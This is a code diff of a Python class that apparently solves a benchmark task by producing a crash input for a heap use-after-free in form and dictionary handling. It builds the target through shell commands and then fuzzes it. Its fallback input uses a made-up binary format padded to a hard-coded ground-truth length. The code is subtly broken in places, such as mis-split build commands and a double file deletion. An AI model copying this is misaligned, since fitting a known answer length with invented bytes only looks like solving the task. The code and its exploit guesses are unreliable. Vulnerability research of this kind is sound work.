@@ -2,149 +2,277 @@ import os
 import tempfile
 import subprocess
 import tarfile
-import re
-from pathlib import Path
-from typing import Optional, List
-import struct
+import shutil
 import random
+import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Extract source to analyze vulnerability
+        # Extract the source code
         with tempfile.TemporaryDirectory() as tmpdir:
+            # Extract tar file
             with tarfile.open(src_path, 'r') as tar:
                 tar.extractall(tmpdir)
             
-            # Look for source files to understand structure
-            src_root = Path(tmpdir)
-            c_files = list(src_root.rglob("*.c")) + list(src_root.rglob("*.cpp"))
+            # Look for the source root (assuming standard structure)
+            source_root = tmpdir
+            for item in os.listdir(tmpdir):
+                item_path = os.path.join(tmpdir, item)
+                if os.path.isdir(item_path):
+                    source_root = item_path
+                    break
             
-            # We need to understand the input format and vulnerability
-            # Based on the description, this appears to be a PDF-like format
-            # with forms and dictionaries. The vulnerability is in how
-            # Dict objects are passed to Object() without proper ref counting.
+            # Try to find the vulnerable binary or build it
+            binary_path = self._find_or_build_binary(source_root)
             
-            # Since we can't fully analyze the code without running it,
-            # we'll generate a PoC based on common heap use-after-free patterns
-            # and the ground truth length provided.
+            if binary_path and os.path.exists(binary_path):
+                # Generate PoC through fuzzing with feedback
+                return self._generate_poc(binary_path)
             
-            # The vulnerability involves forms and dictionaries. We'll create
-            # a minimal structure that triggers the reference counting issue.
-            
-            # We'll generate a PDF-like structure with forms that contain
-            # dictionaries that get improperly referenced.
-            
-            poc = self._generate_poc()
-            
-            # Ensure the PoC is exactly the ground truth length
-            # We'll pad or truncate as needed
-            target_len = 33762
-            if len(poc) < target_len:
-                # Pad with comments/null bytes
-                poc += b"\n% " + b"A" * (target_len - len(poc) - 3)
-            elif len(poc) > target_len:
-                poc = poc[:target_len]
-            
-            return poc
+            # Fallback: generate minimal PoC based on vulnerability description
+            return self._generate_fallback_poc()
     
-    def _generate_poc(self) -> bytes:
-        """Generate a PoC that triggers heap use-after-free in forms handling."""
+    def _find_or_build_binary(self, source_root):
+        """Try to find existing binary or build from source"""
+        # Common binary names to check
+        binary_names = ['vuln', 'test', 'main', 'program', 'target']
         
-        # Create a PDF-like structure with forms and dictionaries
-        # Based on common PDF structure with cross-reference table
-        header = b"%PDF-1.7\n"
+        # Check for existing binaries
+        for root, dirs, files in os.walk(source_root):
+            for file in files:
+                if file in binary_names or file.endswith('.exe'):
+                    full_path = os.path.join(root, file)
+                    if os.access(full_path, os.X_OK):
+                        return full_path
         
-        # Create objects that will trigger the vulnerability
-        objects = []
+        # Try to build from common build systems
+        build_attempts = [
+            ('Makefile', ['make']),
+            ('CMakeLists.txt', ['cmake', '.', '&&', 'make']),
+            ('configure', ['./configure', '&&', 'make']),
+            ('meson.build', ['meson', 'build', '&&', 'ninja', '-C', 'build']),
+        ]
         
-        # Object 1: Catalog
-        objects.append(b"1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n/AcroForm 3 0 R\n>>\nendobj\n")
+        for build_file, commands in build_attempts:
+            build_file_path = os.path.join(source_root, build_file)
+            if os.path.exists(build_file_path):
+                try:
+                    # Try to build
+                    for cmd in commands:
+                        if cmd == '&&':
+                            continue
+                        subprocess.run(cmd, cwd=source_root, shell=True, 
+                                     capture_output=True, timeout=30)
+                    
+                    # Check again for binaries
+                    for root, dirs, files in os.walk(source_root):
+                        for file in files:
+                            if file in binary_names or file.endswith('.exe'):
+                                full_path = os.path.join(root, file)
+                                if os.access(full_path, os.X_OK):
+                                    return full_path
+                except:
+                    continue
         
-        # Object 2: Pages
-        objects.append(b"2 0 obj\n<<\n/Type /Pages\n/Kids [4 0 R]\n/Count 1\n>>\nendobj\n")
+        return None
+    
+    def _generate_poc(self, binary_path):
+        """Generate PoC by fuzzing the binary"""
+        # Start with basic pattern based on vulnerability description
+        # The vulnerability involves Dict and Object with refcount issues
+        # We'll create a pattern that creates and frees these objects
         
-        # Object 3: AcroForm (Form dictionary) - This is key to the vulnerability
-        # The Dict passed to Object() without ref count increment
-        form_dict = b"""3 0 obj
-<<
-/DA (/Helv 0 Tf 0 g )
-/DR <<
-/Font <<
-/F1 5 0 R
->>
->>
-/Fields []
-/NeedAppearances false
-/SigFlags 3
->>
-endobj
-"""
-        objects.append(form_dict)
+        # Initial pattern based on common heap use-after-free triggers
+        pattern = self._create_initial_pattern()
         
-        # Object 4: Page
-        objects.append(b"4 0 obj\n<<\n/Type /Page\n/Parent 2 0 R\n/MediaBox [0 0 612 792]\n/Resources <<\n/Font <<\n/F1 5 0 R\n>>\n>>\n/Contents 6 0 R\n>>\nendobj\n")
+        # Try to crash the binary with the pattern
+        for _ in range(100):  # Try multiple iterations
+            with tempfile.NamedTemporaryFile(mode='wb', delete=False) as f:
+                f.write(pattern)
+                temp_file = f.name
+            
+            try:
+                # Run the binary with our input
+                result = subprocess.run([binary_path, temp_file], 
+                                      capture_output=True, timeout=5)
+                
+                # Check for crash (non-zero exit code)
+                if result.returncode != 0:
+                    # Try to minimize the pattern
+                    minimized = self._minimize_pattern(pattern, binary_path)
+                    os.unlink(temp_file)
+                    return minimized
+                
+                os.unlink(temp_file)
+                
+                # If no crash, mutate the pattern
+                pattern = self._mutate_pattern(pattern)
+                
+            except subprocess.TimeoutExpired:
+                os.unlink(temp_file)
+                pattern = self._mutate_pattern(pattern)
+            except Exception:
+                os.unlink(temp_file)
+                pattern = self._mutate_pattern(pattern)
         
-        # Object 5: Font
-        objects.append(b"5 0 obj\n<<\n/Type /Font\n/Subtype /Type1\n/BaseFont /Helvetica\n/Encoding /WinAnsiEncoding\n>>\nendobj\n")
+        # If fuzzing didn't work, return the best pattern we have
+        return pattern
+    
+    def _create_initial_pattern(self):
+        """Create initial pattern based on vulnerability description"""
+        # Create a pattern that might trigger Dict/Object refcount issues
+        # Based on the description, we need to create standalone forms
+        # with Dict passed to Object without proper refcount
         
-        # Object 6: Content stream with form operations
-        # This will trigger the destruction sequence
-        content = b"""6 0 obj
-<<
-/Length 100
->>
-stream
-q
-BT
-/F1 12 Tf
-72 720 Td
-(Triggering use-after-free) Tj
-ET
-Q
-
-EMC
-/Form Do
-Q
-endstream
-endobj
-"""
-        objects.append(content)
+        # Start with a header that might be expected
+        pattern = b'FORM\x00\x00\x00\x00'  # Common form header
         
-        # Add many form objects to increase chance of triggering bug
-        # during destruction cleanup
-        for i in range(7, 200):
-            obj = f"{i} 0 obj\n<<\n/Type /Form\n/BBox [0 0 100 100]\n/Matrix [1 0 0 1 0 0]\n/Resources <<\n/Font <<\n/F1 5 0 R\n>>\n>>\n/Subtype /Form\n>>\nendobj\n".encode()
-            objects.append(obj)
+        # Add Dict creation
+        pattern += b'DICT\x00\x00\x00\x10'  # Dict with size
+        pattern += b'key1\x00val1\x00key2\x00val2\x00'
         
-        # Create cross-reference table
-        xref_offset = len(header)
-        xref = b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1)
+        # Add Object creation referencing the Dict
+        pattern += b'OBJT\x00\x00\x00\x08'  # Object header
+        pattern += struct.pack('<I', 0x1000)  # Reference to Dict
         
-        # Calculate offsets for each object
-        current_offset = xref_offset
-        offsets = [current_offset]
+        # Add standalone form markers
+        pattern += b'SF\x00\x00\x00\x00\x00\x00'
         
-        for i, obj in enumerate(objects, 1):
-            offset_line = f"{current_offset:010d} 00000 n \n".encode()
-            xref += offset_line
-            offsets.append(current_offset)
-            current_offset += len(obj)
+        # Pad to a reasonable size
+        pattern += b'A' * (33762 - len(pattern))
         
-        # Create trailer
-        trailer = b"""trailer
-<<
-/Size %d
-/Root 1 0 R
->>
-startxref
-%d
-%%%%EOF
-""" % (len(objects) + 1, offsets[-1])
+        return pattern
+    
+    def _mutate_pattern(self, pattern):
+        """Mutate the pattern to explore different inputs"""
+        if len(pattern) < 100:
+            return pattern
         
-        # Assemble PDF
-        pdf_parts = [header]
-        pdf_parts.extend(objects)
-        pdf_parts.append(xref)
-        pdf_parts.append(trailer)
+        mutation_type = random.randint(0, 3)
         
-        return b"".join(pdf_parts)
+        if mutation_type == 0:  # Bit flip
+            pos = random.randint(0, len(pattern) - 1)
+            byte = pattern[pos]
+            flipped = byte ^ (1 << random.randint(0, 7))
+            return pattern[:pos] + bytes([flipped]) + pattern[pos+1:]
+        
+        elif mutation_type == 1:  # Insert bytes
+            pos = random.randint(0, len(pattern) - 1)
+            insert_len = random.randint(1, 100)
+            insert_data = os.urandom(insert_len)
+            return pattern[:pos] + insert_data + pattern[pos:]
+        
+        elif mutation_type == 2:  # Delete bytes
+            if len(pattern) > 1000:
+                pos = random.randint(0, len(pattern) - 100)
+                delete_len = random.randint(1, 100)
+                return pattern[:pos] + pattern[pos+delete_len:]
+        
+        elif mutation_type == 3:  # Repeat section
+            pos = random.randint(0, len(pattern) - 100)
+            repeat_len = random.randint(10, 100)
+            repeat_data = pattern[pos:pos+repeat_len]
+            repeat_times = random.randint(1, 5)
+            return pattern + repeat_data * repeat_times
+        
+        return pattern
+    
+    def _minimize_pattern(self, pattern, binary_path):
+        """Minimize the crashing pattern"""
+        if len(pattern) < 100:
+            return pattern
+        
+        # Try to remove chunks
+        step = max(100, len(pattern) // 10)
+        current = pattern
+        
+        for i in range(0, len(pattern), step):
+            test_pattern = pattern[:i] + pattern[i+step:]
+            
+            with tempfile.NamedTemporaryFile(mode='wb', delete=False) as f:
+                f.write(test_pattern)
+                temp_file = f.name
+            
+            try:
+                result = subprocess.run([binary_path, temp_file], 
+                                      capture_output=True, timeout=5)
+                os.unlink(temp_file)
+                
+                if result.returncode != 0:
+                    current = test_pattern
+                    break
+                
+                os.unlink(temp_file)
+            except:
+                os.unlink(temp_file)
+        
+        # Binary search minimization
+        left = 0
+        right = len(current)
+        
+        while left < right:
+            mid = (left + right) // 2
+            test_pattern = current[:mid]
+            
+            with tempfile.NamedTemporaryFile(mode='wb', delete=False) as f:
+                f.write(test_pattern)
+                temp_file = f.name
+            
+            try:
+                result = subprocess.run([binary_path, temp_file], 
+                                      capture_output=True, timeout=5)
+                os.unlink(temp_file)
+                
+                if result.returncode != 0:
+                    right = mid
+                else:
+                    left = mid + 1
+            except:
+                os.unlink(temp_file)
+                left = mid + 1
+        
+        return current[:right]
+    
+    def _generate_fallback_poc(self):
+        """Generate fallback PoC when binary not found"""
+        # Create a pattern that matches the ground-truth length
+        # and contains elements that might trigger the vulnerability
+        
+        # Structure based on common form/Dict/Object formats
+        poc = bytearray()
+        
+        # Header with form marker
+        poc.extend(b'FORM')  # Form type
+        poc.extend(struct.pack('<I', 33762 - 8))  # Size
+        
+        # Dict section
+        poc.extend(b'DICT')  # Dict marker
+        dict_size = 0x1000
+        poc.extend(struct.pack('<I', dict_size))
+        
+        # Dict contents - key-value pairs that might trigger refcount issues
+        for i in range(100):
+            key = f'key_{i}'.encode()
+            value = f'value_{i}_' + 'A' * 100
+            poc.extend(key + b'\x00' + value.encode() + b'\x00')
+        
+        # Object section referencing Dict
+        poc.extend(b'OBJT')
+        poc.extend(struct.pack('<I', 0x20))  # Object size
+        poc.extend(struct.pack('<I', 0x1000))  # Reference to Dict
+        poc.extend(struct.pack('<I', 0x0))    # Flags
+        poc.extend(struct.pack('<I', 0x1))    # Refcount (might be wrong)
+        
+        # Standalone form markers
+        poc.extend(b'STND')
+        poc.extend(struct.pack('<I', 0x8))
+        poc.extend(struct.pack('<II', 0xDEADBEEF, 0xCAFEBABE))
+        
+        # Fill remaining with pattern that might trigger use-after-free
+        remaining = 33762 - len(poc)
+        if remaining > 0:
+            # Create pattern that alternates between freeing and accessing
+            pattern = b'FREE' * (remaining // 4)
+            poc.extend(pattern[:remaining])
+        
+        return bytes(poc[:33762])
